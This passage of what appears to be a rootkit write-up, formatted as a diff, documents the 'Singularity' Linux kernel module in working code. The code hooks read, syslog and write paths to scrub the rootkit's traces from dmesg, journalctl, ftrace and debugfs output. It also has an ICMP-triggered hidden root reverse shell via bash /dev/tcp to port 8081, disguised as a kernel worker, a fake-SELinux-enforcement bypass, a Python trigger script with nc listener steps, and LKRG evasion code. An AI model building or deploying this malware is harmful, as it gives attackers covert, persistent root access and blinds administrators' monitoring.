+    io_uring_prep_write(sqe, fd, "0\n", 2, 0);
+    io_uring_submit(&ring);
+
+    // This will fail with -EINVAL (Invalid argument)
+
+
+============================================================================
+[0x09] - LOGS REMEMBER
+============================================================================
+
+Module load messages, ftrace names, taint reports and tool output can remain
+visible after the other filters are in place.
+
+clear_taint_dmesg.c edits reads. hooks_write.c catches selected output sinks
+and the fake ftrace controls. The split is mostly historical; there simply
+is not one kernel "log path" to hook.
+
+
+  --[ Keyword filtering
+
+
+notrace static bool line_contains_sensitive_info(const char *line)
+{
+    const char *p;
+
+    if (!line)
+        return false;
+
+    // Scan each character in the line
+    for (p = line; *p; p++) {
+        switch (*p) {
+
+        case '_':
+            if (strncmp(p, "__builtin__ftrace", 17) == 0) return true;
+            break;
+
+        case 'c':
+            if (strncmp(p, "create_trampoline+", 18) == 0) return true;
+            if (strncmp(p, "constprop", 9) == 0) return true;
+            if (strncmp(p, "called before initial load_policy", 33) == 0)
+                return true;
+            break;
+
+        case 'h':
+            if (strncmp(p, "hook", 4) == 0) return true;
+            break;
+
+        case 't':
+            break;
+
+        case 's':
+            if (strncmp(p, "singularity", 11) == 0) return true;
+            if (strncmp(p, "security_sid_to_context_core", 28) == 0)
+                return true;
+            break;
+
+        case 'S':
+            if (strncmp(p, "Singularity", 11) == 0) return true;
+            break;
+
+        case 'u':
+            if (strncmp(p, "unrecognized netlink message", 28) == 0)
+                return true;
+            if (strncmp(p, "unknown SID", 11) == 0)
+                return true;
+            break;
+
+        case 'm':
+            if (strncmp(p, "matheuz", 7) == 0) return true;
+            break;
+
+        case 'z':
+            if (strncmp(p, "zer0t", 5) == 0) return true;
+            break;
+
+        case 'o':
+            if (strncmp(p, "obliviate", 9) == 0) return true;
+            break;
+
+        case 'k':
+            if (strncmp(p, "kallsyms_lookup_name", 20) == 0) return true;
+            break;
+
+        case 'f':
+            if (strncmp(p, "filter_kmsg", 11) == 0) return true;
+            if (strncmp(p, "fh_install", 10) == 0) return true;
+            if (strncmp(p, "fh_remove", 9) == 0) return true;
+            if (strncmp(p, "ftrace_helper", 13) == 0) return true;
+            break;
+        }
+    }
+
+    return false;
+}
+
+
+The switch avoids walking the full keyword set at every byte; it is still a
+substring filter, with all the false-positive and timing edges that implies.
+
+
+  --[ File detection
+
+Generic logs are selected by basename; the tracing controls get stricter
+filesystem and parent checks.
+
+
+notrace static bool should_filter_file(const char *filename) {
+    if (!filename)
+        return false;
+
+    return (strcmp(filename, "kmsg") == 0 ||
+            strcmp(filename, "kallsyms") == 0 ||
+            strcmp(filename, "enabled_functions") == 0 ||
+            strcmp(filename, "debug") == 0 ||
+            strcmp(filename, "trace") == 0 ||
+            strcmp(filename, "kern.log") == 0 ||
+            strcmp(filename, "kern.log.1") == 0 ||
+            strcmp(filename, "syslog") == 0 ||
+            strcmp(filename, "auth.log") == 0 ||
+            strcmp(filename, "auth.log.1") == 0 ||
+            strcmp(filename, "vmallocinfo") == 0 ||
+            strcmp(filename, "syslog.1") == 0 ||
+            strcmp(filename, "trace_pipe") == 0 ||
+            strcmp(filename, "kcore") == 0 ||
+            strcmp(filename, "touched_functions") == 0);
+}
+
+
+For critical files, the hook verifies the full path structure.
+
+
+static notrace bool is_real_ftrace_enabled(struct file *file)
+{
+    const char *name = NULL;
+    struct dentry *dentry, *parent;
+    struct super_block *sb;
+
+    if (!file || !file->f_path.dentry)
+        return false;
+
+    dentry = file->f_path.dentry;
+    if (dentry->d_name.name)
+        name = dentry->d_name.name;
+
+    // Must be exactly "ftrace_enabled"
+    if (!name || strcmp(name, "ftrace_enabled") != 0)
+        return false;
+
+    // Must be on proc or sysfs
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+
+    sb = file->f_path.mnt->mnt_sb;
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+
+    if (strcmp(sb->s_type->name, "proc") != 0 &&
+        strcmp(sb->s_type->name, "sysfs") != 0)
+        return false;
+
+    // Verify path: /proc/sys/kernel/ftrace_enabled
+    parent = dentry->d_parent;
+    if (!parent || !parent->d_name.name ||
+        strcmp(parent->d_name.name, "kernel") != 0)
+        return false;
+
+    parent = parent->d_parent;
+    if (!parent || !parent->d_name.name ||
+        strcmp(parent->d_name.name, "sys") != 0)
+        return false;
+
+    return true;
+}
+
+static notrace bool is_real_tracing_on(struct file *file)
+{
+    const char *name = NULL;
+    struct dentry *dentry;
+    struct super_block *sb;
+
+    if (!file || !file->f_path.dentry)
+        return false;
+
+    dentry = file->f_path.dentry;
+    if (dentry->d_name.name)
+        name = dentry->d_name.name;
+
+    if (!name || strcmp(name, "tracing_on") != 0)
+        return false;
+
+    if (!file->f_path.mnt || !file->f_path.mnt->mnt_sb)
+        return false;
+
+    sb = file->f_path.mnt->mnt_sb;
+    if (!sb->s_type || !sb->s_type->name)
+        return false;
+
+    if (strcmp(sb->s_type->name, "tracefs") != 0 &&
+        strcmp(sb->s_type->name, "debugfs") != 0)
+        return false;
+
+    return true;
+}
+
+trace, trace_pipe, enabled_functions and touched_functions use the same
+format: exact basename, expected filesystem, expected parents, so a
+user-created lookalike should not trip the filter.
+
+  --[ read()
+
+The read-side hooks are the core of log filtering. clear_taint_dmesg.c
+covers read(), pread64(), readv(), preadv(), do_syslog(), and selected
+seq-file diagnostic paths, with IA32 variants for the hooked read-style
+syscalls.
+
+
+The following is a control-flow sketch, not a literal full copy of
+hook_read():
+
+static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
+    /* declarations omitted */
+
+    // SPECIAL CASE 1: ftrace_enabled read interception
+    if (ftrace_write_intercepted) {
+        struct file *check_file = fget(fd);
+        if (check_file) {
+            if (is_real_ftrace_enabled(check_file)) {
+                // Return fake value with rate limiting
+                /* rate-limited fake read; implementation omitted */
+            }
+        }
+    }
+
+    file = fget(fd);
+    if (!file)
+        return orig_read(regs);
+
+    // SPECIAL CASE 2: Fake ftrace disabled - hide function lists
+    if (is_ftrace_fake_disabled()) {
+        if (is_enabled_functions_file(file) ||
+            is_touched_functions_file(file)) {
+            fput(file);
+            return 0;  // Return empty
+        }
+    }
+
+    // SPECIAL CASE 3: Cgroup PID filtering
+    if (is_cgroup_pid_file(file)) {
+        orig_res = orig_read(regs);
+        fput(file);
+        if (orig_res <= 0)
+            return orig_res;
+        return filter_cgroup_pids(user_buf, orig_res);
+    }
+
+    // SPECIAL CASE 4: Conntrack filtering
+    if (is_nf_conntrack_file(file)) {
+        orig_res = orig_read(regs);
+        fput(file);
+        if (orig_res <= 0)
+            return orig_res;
+        return filter_conntrack_output(user_buf, orig_res);
+    }
+
+    // SPECIAL CASE 5: trace_pipe - blocking reads
+    if (is_trace_pipe_file(file)) {
+        ftrace_disabled = is_ftrace_fake_disabled();
+
+        if (ftrace_disabled) {
+            fput(file);
+            // Keep blocking forever, consuming filtered lines
+            do {
+                orig_res = orig_read(regs);
+                if (orig_res < 0) return orig_res;
+                if (orig_res == 0) return 0;
+                if (signal_pending(current)) return -EINTR;
+            } while (1);
+        }
+
+        orig_res = orig_read(regs);
+        fput(file);
+        return filter_trace_pipe_output(user_buf, orig_res);
+    }
+
+    // SPECIAL CASE 6: trace file - header freezing
+    if (is_trace_file(file)) {
+        ftrace_disabled = is_ftrace_fake_disabled();
+
+        if (ftrace_disabled && file->f_pos > 0) {
+            fput(file);
+            return 0;  // Only return header on first read
+        }
+
+        orig_res = orig_read(regs);
+        res = filter_trace_output(user_buf, orig_res);
+        fput(file);
+        return res;
+    }
+
+    // GENERAL LOG FILE FILTERING
+    // ... handles kmsg, kallsyms, kcore, vmallocinfo, kern.log, etc.
+}
+
+
+static struct ftrace_hook hooks[] = {
+    // Basic read
+    HOOK("__x64_sys_read", hook_read, &orig_read),
+    HOOK("__ia32_sys_read", hook_read_ia32, &orig_read_ia32),
+
+    // Positional read
+    HOOK("__x64_sys_pread64", hook_pread64, &orig_pread64),
+    HOOK("__ia32_sys_pread64", hook_pread64_ia32, &orig_pread64_ia32),
+
+    // Vectored reads
+    HOOK("__x64_sys_readv", hook_readv, &orig_readv),
+    HOOK("__ia32_sys_readv", hook_readv_ia32, &orig_readv_ia32),
+    HOOK("__x64_sys_preadv", hook_preadv, &orig_preadv),
+    HOOK("__ia32_sys_preadv", hook_preadv_ia32, &orig_preadv_ia32),
+
+    // System log
+    HOOK("do_syslog", hook_do_syslog, &orig_do_syslog),
+
+    // Scheduler debug
+    HOOK("sched_debug_show", hook_sched_debug_show, &orig_sched_debug_show),
+};
+
+The array contains ten read-side hooks, including IA32 variants.
+
+
+  --[ klogctl() / syslog() Hook
+
+dmesg uses the syslog() syscall to read the kernel ring buffer. do_syslog()
+is hooked to filter this at the source.
+
+
+static notrace int hook_do_syslog(int type, char __user *user_buf,
+                                  int len, int source)
+{
+    int ret, orig_ret;
+    char *kernel_buf, *filtered_buf, *line_start, *line_end;
+    size_t filtered_len = 0;
+    size_t alloc_size;
+
+    if (!orig_do_syslog)
+        return -EINVAL;
+
+    if (type != SYSLOG_ACTION_READ &&
+        type != SYSLOG_ACTION_READ_ALL &&
+        type != SYSLOG_ACTION_READ_CLEAR)
+        return orig_do_syslog(type, user_buf, len, source);
+
+    if (!user_buf || len <= 0)
+        return orig_do_syslog(type, user_buf, len, source);
+
+    ret = orig_do_syslog(type, user_buf, len, source);
+    orig_ret = ret;
+    if (ret <= 0)
+        return ret;
+
+    alloc_size = ret;
+    if (alloc_size > MAX_CAP)
+        alloc_size = MAX_CAP;
+
+    kernel_buf = kvmalloc(alloc_size + 1, GFP_KERNEL);
+    if (!kernel_buf)
+        return ret;
+
+    if (copy_from_user(kernel_buf, user_buf, alloc_size)) {
+        kvfree(kernel_buf);
+        return ret;
+    }
+    kernel_buf[alloc_size] = '\0';
+
+    filtered_buf = kvzalloc(alloc_size + 1, GFP_KERNEL);
+    if (!filtered_buf) {
+        kvfree(kernel_buf);
+        return ret;
+    }
+
+    line_start = kernel_buf;
+    while ((line_end = strchr(line_start, '\n'))) {
+        size_t line_len = line_end - line_start;
+        char saved = *line_end;
+        *line_end = '\0';
+
+        if (!line_contains_sensitive_info(line_start)) {
+            if (filtered_len + line_len + 1 <= alloc_size) {
+                memcpy(filtered_buf + filtered_len, line_start, line_len);
+                filtered_len += line_len;
+                filtered_buf[filtered_len++] = '\n';
+            }
+        }
+
+        *line_end = saved;
+        line_start = line_end + 1;
+    }
+
+    if (*line_start && !line_contains_sensitive_info(line_start)) {
+        size_t remaining = strlen(line_start);
+        if (filtered_len + remaining <= alloc_size) {
+            memcpy(filtered_buf + filtered_len, line_start, remaining);
+            filtered_len += remaining;
+        }
+    }
+
+    if (filtered_len == 0) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        if (clear_user(user_buf, orig_ret))
+            return -EFAULT;
+        return 0;
+    }
+
+    if (copy_to_user(user_buf, filtered_buf, filtered_len)) {
+        kvfree(kernel_buf);
+        kvfree(filtered_buf);
+        return -EFAULT;
+    }
+
+    if (filtered_len < orig_ret) {
+        if (clear_user(user_buf + filtered_len, orig_ret - filtered_len)) {
+            kvfree(kernel_buf);
+            kvfree(filtered_buf);
+            return -EFAULT;
+        }
+    }
+
+    kvfree(kernel_buf);
+    kvfree(filtered_buf);
+    return (int)filtered_len;
+}
+
+This is the path used by dmesg and klogctl().
+
+
+  --[ Journalctl Filtering
+
+journalctl -k style output can be affected in two places in the tree:
+read-side filtering in clear_taint_dmesg.c, and output-stage filtering via
+write() hooks in hooks_write.c.
+
+When journalctl writes kernel log output to stdout/stderr, the write hook
+filters it before it reaches the terminal.
+
+From modules/hooks_write.c:
+
+static notrace bool is_kernel_log_output(const char *buf, size_t len)
+{
+    if (len < 50)
+        return false;
+
+    // Check for kernel log format: "[  123.456] message"
+    if (memmem_k(buf, len, "[    ", 5) || memmem_k(buf, len, "[ ", 2)) {
+        if (memmem_k(buf, len, "] ", 2))
+            return true;
+    }
+
+    // Check for "kernel:" prefix
+    if (memmem_k(buf, len, "kernel:", 7))
+        return true;
+
+    if (memmem_k(buf, len, " kernel:", 8))
+        return true;
+
+    return false;
+}
+
+The write hook only filters when the buffer looks like kernel log output and
+contains a targeted string.
+
+
+  --[ Forensics output
+
+Tools like debugfs bypass normal filesystem access by reading raw block
+devices directly. This reveals files that are "hidden" at the VFS layer.
+
+Example without protection:
+
+$ debugfs /dev/sda1 -R 'ls -l /home/user'
+1890 100644 (2) user  user  1234  Jan 08 10:15 <hidden-name>.txt
+
+hooks_write.c catches this at the output stage. Piped and direct output are
+treated differently:
+
+1. Direct filesystem-tool style output, without a pipe:
+   the hidden token is overwritten in place.
+2. Output flowing through a pipe:
+   lines containing the hidden token are dropped entirely.
+
+
+From modules/hooks_write.c:
+
+static notrace bool is_fs_tool_output(const char *buf, size_t len)
+{
+    // Pattern 1: "debugfs:" prefix
+    if (memmem_k(buf, len, "debugfs:", 8))
+        return true;
+
+    // Pattern 2: Inode listing "  1890 100644 (2) user..."
+    if (len > 10) {
+        size_t i = 0;
+        int spaces = 0, digits = 0;
+
+        // Count leading spaces
+        while (i < len && buf[i] == ' ') { spaces++; i++; }
+
+        // Count digits (inode number)
+        while (i < len && buf[i] >= '0' && buf[i] <= '9') { digits++; i++; }
+
+        // Spaces + digits + parentheses = inode listing
+        if (digits >= 1 && spaces >= 1) {
+            if (memmem_k(buf, len, "(", 1) && memmem_k(buf, len, ")", 1))
+                return true;
+        }
+    }
+
+    // Pattern 3: Filesystem metadata
+    if (memmem_k(buf, len, "Inode count:", 12))
+        return true;
+    if (memmem_k(buf, len, "Block count:", 12))
+        return true;
+    if (memmem_k(buf, len, "Filesystem volume name:", 23))
+        return true;
+    if (memmem_k(buf, len, "Filesystem UUID:", 16))
+        return true;
+    if (memmem_k(buf, len, "e2fsck", 6))
+        return true;
+    if (memmem_k(buf, len, "Inode:", 6))
+        return true;
+
+    return false;
+}
+
+
+static notrace void sanitize_fs_tool_buffer_inplace(char *buf, size_t len)
+{
+    const size_t pattern_len = 11;  // example hidden token length
+    char *ptr;
+    size_t remaining;
+    void *found;
+
+    if (!buf || len < pattern_len)
+        return;
+
+    ptr = buf;
+    remaining = len;
+
+    // Replace the matched hidden token with spaces
+    while (remaining >= pattern_len) {
+        // Case-insensitive search
+        found = memmem_ci(ptr, remaining, "singularity", pattern_len);
+        if (!found)
+            break;
+
+        // Replace the matched hidden token with spaces, preserving size
+        memset(found, ' ', pattern_len);
+
+        ptr = (char *)found + pattern_len;
+        remaining = len - (ptr - buf);
+    }
+}
+
+
+The two branches are visible in the write hook:
+
+
+Abridged from modules/hooks_write.c:
+
+// Check if this is forensics tool output
+is_fs_tool = process_has_block_device_open() ||
+             is_fs_tool_output(kernel_buf, count);
+
+needs_singularity_filter = buffer_has_singularity(kernel_buf, count) &&
+                           (is_fs_tool || is_pipe);
+
+// If filesystem tool output and not piped, sanitize in place
+if (needs_singularity_filter && is_fs_tool && !is_pipe) {
+    sanitize_fs_tool_buffer_inplace(kernel_buf, count);
+
+    copy_to_user(user_buf, kernel_buf, count);
+    return original_write(regs);  // Write sanitized buffer
+}
+
+// If output is piped, drop matching lines entirely
+if (needs_singularity_filter && is_pipe) {
+    filtered_len = filter_singularity_lines(kernel_buf, count);
+    ...
+}
+
+process_has_block_device_open() and the output test keep the rewrite
+away from unrelated writes.
+
+
+  --[ Freezing trace headers
+
+The /sys/kernel/debug/tracing/trace file requires special handling when
+ftrace appears "disabled".
+
+
+static notrace ssize_t filter_trace_output(char __user *user_buf,
+                                           ssize_t bytes_read)
+{
+    // Static variables persist between calls
+    static char frozen_header[4096] = {0};
+    static size_t frozen_header_len = 0;
+    static bool header_initialized = false;
+
+    ftrace_disabled = is_ftrace_fake_disabled();
+
+    // MODE 1: Ftrace ENABLED - normal filtering
+    if (!ftrace_disabled) {
+        header_initialized = false;
+        frozen_header_len = 0;
+        // ... filter lines normally ...
+        return filtered_len;
+    }
+
+    // MODE 2: Ftrace DISABLED - freeze header
+
+    // First read: capture header (lines starting with #)
+    if (!header_initialized) {
+        copy_from_user(kernel_buf, user_buf, bytes_read);
+
+        line_start = kernel_buf;
+        while ((line_end = strchr(line_start, '\n'))) {
+            if (line_start[0] == '#') {
+                // Copy header line to frozen buffer
+                memcpy(frozen_header + frozen_header_len, line_start,
+                    line_len);
+                frozen_header_len += line_len + 1;
+            }
+            line_start = line_end + 1;
+        }
+
+        header_initialized = true;
+    }
+
+    // Subsequent reads: return frozen header
+    copy_to_user(user_buf, frozen_header, frozen_header_len);
+    return frozen_header_len;
+}
+
+The trace file header looks like:
+# tracer: function
+#
+# entries-in-buffer/entries-written: 1350/54321   #P:4
+#
+#           TASK-PID     CPU#  TIMESTAMP  FUNCTION
+#              | |         |       |         |
+            bash-1337    [000] 1350.678: do_sys_openat2 <-__x64_sys_openat
+
+The implementation:
+1. Captures header on first read
+2. Stores the header in the static frozen_header buffer
+3. Returns ONLY header on subsequent reads
+4. Returns 0 if file position > 0 (EOF after header)
+
+The reader sees a frozen header while ftrace continues to run.
+
+
+  --[ Trace Pipe Blocking
+
+trace_pipe is a BLOCKING read that waits for new data.
+
+
+if (is_trace_pipe_file(file)) {
+    ftrace_disabled = is_ftrace_fake_disabled();
+
+    if (ftrace_disabled) {
+        fput(file);
+        // Infinite loop - consume and discard data
+        do {
+            orig_res = orig_read(regs);
+            if (orig_res < 0) return orig_res;
+            if (orig_res == 0) return 0;
+            if (signal_pending(current)) return -EINTR;  // Ctrl+C
+        } while (1);
+    }
+
+    // Normal mode: filter and return
+    orig_res = orig_read(regs);
+    return filter_trace_pipe_output(user_buf, orig_res);
+}
+
+When ftrace is fake-disabled, trace_pipe reads enter an infinite loop:
+- Read from the pipe and block until data arrives
+- Discard the data
+- Loop
+
+It looks like a stopped trace pipe; the reader sits there until interrupted.
+
+  --[ Quick check
+
+    $ dmesg | grep -Ei 'singularity|ftrace_helper|kallsyms_lookup_name'
+    (no output)
+    $ journalctl -k | grep -i singularity
+    (no output)
+
+These examples concern selected strings in the displayed output. They are
+not evidence of complete log removal.
+
+
+============================================================================
+[0x0A] - NO LISTENING PORT
+============================================================================
+
+There is no listening control port. An ICMP echo request from the configured
+address with the chosen sequence number queues the shell worker, so from
+there it reuses the hide/elevate path described earlier and, when the kernel
+supports it, the SELinux path.
+
+
+ICMP echo request:
+
+     0                   1                   2                   3
+     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+    |     Type (8)  |     Code (0)  |          Checksum             |
+    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+    |           Identifier          |        Sequence Number        |
+    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+    |     Data ...
+    +-+-+-+-+-+-
+
+The sequence number field is normally used to match echo requests with
+replies. Here it is repurposed as the trigger.
+
+
+  --[ The Magic Trigger
+
+Instead of hiding magic bytes in the payload, the sequence number in the
+ICMP header itself is the signal.
+
+    #define ICMP_MAGIC_SEQ 1337
+
+The sequence field is fixed in the ICMP header, so the hook does not need a
+payload parser; the source address, ICMP type and sequence value all have to
+match before work is queued.
+
+
+  --[ icmp_rcv()
+
+icmp_rcv() receives all ICMP packets. The hook:
+
+From modules/icmp.c:
+
+static int (*orig_icmp_rcv)(struct sk_buff *skb);
+
+static notrace asmlinkage int hook_icmp_rcv(struct sk_buff *skb)
+{
+    struct iphdr *iph;
+    struct icmphdr *icmph;
+    u32 trigger_ip;
+    struct revshell_work *rw;
+
+    if (!skb)
+        goto out;
+
+    iph = ip_hdr(skb);
+    if (!iph || iph->protocol != IPPROTO_ICMP)
+        goto out;
+
+    icmph = icmp_hdr(skb);
+    if (!icmph)
+        goto out;
+
+    if (!in4_pton(YOUR_SRV_IP, -1, (u8 *)&trigger_ip, -1, NULL))
+        goto out;
+
+    // Check sequence number, not payload
+    if (iph->saddr == trigger_ip &&
+        icmph->type == ICMP_ECHO &&
+        ntohs(icmph->un.echo.sequence) == ICMP_MAGIC_SEQ) {
+
+        // Magic sequence detected! Spawn reverse shell via workqueue
+        rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
+        if (rw) {
+            INIT_WORK(&rw->work, spawn_revshell);
+            schedule_work(&rw->work);
+        }
+    }
+
+out:
+    return orig_icmp_rcv(skb);
+}
+
+The packet is not dropped after the match; the hook queues the work and
+passes the skb to orig_icmp_rcv(), so the echo request still gets its normal
+reply.
+
+
+  --[ The shell worker
+
+The actual shell spawning happens in a workqueue to avoid blocking the ICMP
+receive path. The path is:
+
+#define SRV_PORT "8081"
+#define PROC_NAME "[kworker/0:1]"
+
+static void spawn_revshell(struct work_struct *work)
+{
+    char cmd[768];
+    static char *envp[] = {
+        "HOME=/",
+        "TERM=xterm-256color",
+        "PATH=/usr/bin:/bin:/usr/sbin:/sbin",
+        NULL
+    };
+    char *argv[] = {"/bin/bash", "-c", cmd, NULL};
+    struct subprocess_info *sub_info;
+
+    extern void enable_umh_bypass(void);
+    extern void disable_umh_bypass(void);
+
+    enable_umh_bypass();
+
+    add_hidden_pid(current->pid);
+    add_hidden_pid(current->tgid);
+
+    // Try the SELinux bypass before spawning.
+    bypass_selinux_disable();
+
+    msleep(50);
+
+    // Build the command with self-hiding via kill -59.
+    snprintf(cmd, sizeof(cmd),
+             "bash -c '"
+             "PID=$$; "
+             "kill -59 $PID 2>/dev/null; "
+             "exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1"
+             "' 2>/dev/null &",
+             PROC_NAME, YOUR_SRV_IP, SRV_PORT);
+
+    // Spawn through call_usermodehelper.
+    sub_info = call_usermodehelper_setup(argv[0], argv, envp,
+                                        GFP_KERNEL, NULL, NULL, NULL);
+    if (sub_info)
+        call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
+
+    disable_umh_bypass();
+
+    kfree(container_of(work, struct revshell_work, work));
+}
+
+The worker launches /bin/bash -c <cmd> through call_usermodehelper_*(). The
+helper context is hidden first; the spawned shell then uses kill -59 and the
+descendant tracking described earlier.
+
+The process name is still faked using exec -a "[kworker/0:1]" to appear as a
+legitimate kernel worker thread.
+
+The reverse shell connects to port 8081 (configured via SRV_PORT). SELinux
+enforcement is only actually flipped off when the kernel was built with
+CONFIG_SECURITY_SELINUX_DEVELOP. Once that bypass path is active, the module
+clears the real in-kernel enforcement bit and also fakes the visible
+enforcement state through its SELinux hooks.
+
+
+  --[ SELinux
+
+If SELinux is in enforcing mode, the shell will be confined by policy.
+Singularity tries to disable enforcement and also fake the visible
+enforcement status, but the actual disable step is conditional on kernel
+configuration.
+
+From modules/icmp.c:
+
+static void *selinux_state_ptr = NULL;
+static bool enforce_hook_active = false;
+static int fake_enforce_value = 1;
+
+notrace static int bypass_selinux_disable(void)
+{
+    struct {
+        bool enforcing;
+        bool checkreqprot;
+        bool initialized;
+    } *state;
+
+    if (!selinux_state_ptr)
+        return -1;
+
+    state = selinux_state_ptr;
+
+    #ifdef CONFIG_SECURITY_SELINUX_DEVELOP
+    state->enforcing = 0;
+    enforce_hook_active = true;
+    fake_enforce_value = 1;
+    #endif
+
+    return 0;
+}
+
+The SELinux enforcement read/write functions are also hooked. Once
+enforce_hook_active is set, reads return the fake value and writes update
+that fake value instead of the real enforcement state:
+
+notrace static asmlinkage ssize_t hook_sel_read_enforce(
+    struct file *filp,
+    char __user *buf,
+    size_t count,
+    loff_t *ppos)
+{
+    char tmpbuf[12];
+    ssize_t length;
+
+    if (enforce_hook_active) {
+        // Return fake "1" (enforcing) even though it's disabled
+        length = scnprintf(tmpbuf, sizeof(tmpbuf), "%d",
+                          fake_enforce_value);
+
+        return simple_read_from_buffer(buf, count, ppos, tmpbuf, length);
+    }
+
+    return orig_sel_read_enforce(filp, buf, count, ppos);
+}
+
+notrace static asmlinkage ssize_t hook_sel_write_enforce(
+    struct file *filp,
+    const char __user *buf,
+    size_t count,
+    loff_t *ppos)
+{
+    char kbuf[32];
+    long val;
+    int ret;
+
+    if (!enforce_hook_active)
+        return orig_sel_write_enforce(filp, buf, count, ppos);
+
+    // Accept writes but only update our fake value
+    if (count > 0 && count < sizeof(kbuf)) {
+        if (copy_from_user(kbuf, buf, count))
+            return -EFAULT;
+
+        kbuf[count] = '\0';
+
+        ret = kstrtol(kbuf, 10, &val);
+        if (ret == 0) {
+            fake_enforce_value = (int)val;
+        }
+    }
+
+    *ppos += count;
+    return count;  // Pretend write succeeded
+}
+
+When CONFIG_SECURITY_SELINUX_DEVELOP is enabled and the bypass path has been
+activated, the observable effect looks like this:
+
+    $ getenforce
+    Enforcing          # <- fake visible state
+
+    $ setenforce 0
+    (appears to work but only changes fake_enforce_value)
+
+    $ getenforce
+    Permissive
+
+Without that kernel config, this deception path is not activated and these
+outputs should not be presented as guaranteed behavior.
+
+
+  --[ Trigger Script
+
+From the attacker machine, send an ICMP packet with sequence 1337:
+
+$ cat > trigger.py << 'EOF'
+#!/usr/bin/env python3
+import socket
+import struct
+import sys
+
+if len(sys.argv) != 2:
+    print(f"Usage: {sys.argv[0]} <target_ip>")
+    sys.exit(1)
+
+target = sys.argv[1]
+
+# Magic values
+MAGIC_SEQ = 1337
+ICMP_ECHO_REQUEST = 8
+PAYLOAD = b'_TRIGGER_REVSHELL'
+
+def calculate_checksum(packet):
+    checksum = 0
+    for i in range(0, len(packet), 2):
+        w = (packet[i] << 8)
+        if i + 1 < len(packet):
+            w += packet[i+1]
+        checksum += w
+    checksum = (checksum >> 16) + (checksum & 0xffff)
+    checksum = ~checksum & 0xffff
+    return checksum
+
+# Create ICMP header with magic sequence number
+header = struct.pack('!BBHHH',
+                     ICMP_ECHO_REQUEST,
+                     0,  # code
+                     0,  # checksum (calculated below)
+                     1337,  # ID
+                     MAGIC_SEQ)
+
+packet = header + PAYLOAD
+checksum = calculate_checksum(packet)
+
+# Rebuild with correct checksum
+header = struct.pack('!BBHHH',
+                     ICMP_ECHO_REQUEST,
+                     0,
+                     checksum,
+                     1337,
+                     MAGIC_SEQ)  # <- SEQUENCE NUMBER = 1337
+
+packet = header + PAYLOAD
+
+# Create raw ICMP socket and send
+sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+
+print(f"[*] Sending magic ICMP (seq=1337) to {target}")
+sock.sendto(packet, (target, 0))
+print("[*] Packet sent! Check for reverse shell on port 8081")
+
+sock.close()
+EOF
+
+$ chmod +x trigger.py
+
+
+  --[ Usage
+
+1. On the attacker's machine, start a listener:
+
+    $ nc -lvnp 8081
+
+2. Send trigger packet:
+
+    $ sudo python3 trigger.py 192.168.1.100
+
+3. Receive shell:
+
+    Listening on 0.0.0.0 8081
+    Connection received on 192.168.1.100 45678
+    bash: no job control in this shell
+    [kworker/0:1]:/#
+
+The shell is started as root, appears as "[kworker/0:1]", and is hidden from
+the process-enumeration paths covered by the current process-hiding modules.
+
+4. Check the listed views:
+
+    On target:
+    $ ps aux | grep bash
+    (reverse shell doesn't appear)
+
+    $ netstat -tunp | grep 8081
+    (connection doesn't appear)
+
+    $ lsof -i :8081
+    (no output)
+
+    $ ss -tulpn | grep 8081
+    (no output)
+
+
+============================================================================
+[0x0B] - HIDING THE HOOKS
+============================================================================
+
+The module itself leaves code, ftrace state, symbols, pages and taint. It
+can also provoke integrity checks. This section covers those traces.
+
+  --[ LKRG: exact scope
+
+lkrg_bypass.c filters logs, changes selected control fields, wraps the
+helper path and hooks selected validation points.
+
+It does six things:
+
+1. Filtering LKRG-related log output through vprintk_emit()
+2. Discovery and relaxation of selected LKRG control fields
+3. Temporary wrapping of call_usermodehelper_exec*() paths
+4. Suppression of selected SIGKILL delivery through send_sig_info()
+5. Direct hook coverage for selected LKRG exploit-detection / enforcement
+   functions
+6. Load-order handling: an immediate hook attempt at init plus a delayed
+   retry when an LKRG module later reaches MODULE_STATE_LIVE
+
+
+The current tree does not use the old multi symbol. Control
+discovery starts in lkrg_find_ctrl(), which resolves p_ro and tries two
+interpretations: the embedded ctrl member of struct lkrg_ro_view, then p_ro
+itself as a struct lkrg_ctrl_conf, ctrl_ok() rejects any layout whose
+control fields fall outside small sanity ranges.
+
+static notrace struct lkrg_ctrl_conf *lkrg_find_ctrl(void)
+{
+    void *ro;
+    struct lkrg_ctrl_conf *ctrl;
+
+    if (lkrg_ctrl)
+        return lkrg_ctrl;
+
+    ro = resolve_sym("p_ro");
+    if (ro) {
+        ctrl = &((struct lkrg_ro_view *)ro)->p_lkrg_global_ctrl.ctrl;
+        if (ctrl_ok(ctrl))
+            return ctrl;
+
+        ctrl = (struct lkrg_ctrl_conf *)ro;
+        if (ctrl_ok(ctrl))
+            return ctrl;
+    }
+
+    return lkrg_scan_module_memory();
+}
+
+If the p_ro route does not return a valid structure, lkrg_find_ctrl() falls
+back to lkrg_scan_module_memory(). That scan walks the module address range
+a page at a time with copy_from_kernel_nofault(), keeping the first
+candidate that passes control-field checks plus p_hide_lkrg, interval and
+log-level constraints, two candidates and it returns NULL rather than
+guessing.
+
+    for (addr = MODULES_VADDR; addr + sizeof(buf) <= MODULES_END;
+         addr += PAGE_SIZE) {
+        if (copy_from_kernel_nofault(&buf, (void *)addr, sizeof(buf)) != 0)
+            continue;
+        if (!ctrl_ok(&buf))
+            continue;
+        if (buf.p_hide_lkrg != 1)
+            continue;
+        if (!buf.p_umh_validate && !buf.p_pint_validate &&
+            !buf.p_pcfi_validate)
+            continue;
+        if (buf.p_interval < 5 || buf.p_interval > 1800)
+            continue;
+        candidates++;
+        found = (struct lkrg_ctrl_conf *)addr;
+        if (candidates > 1)
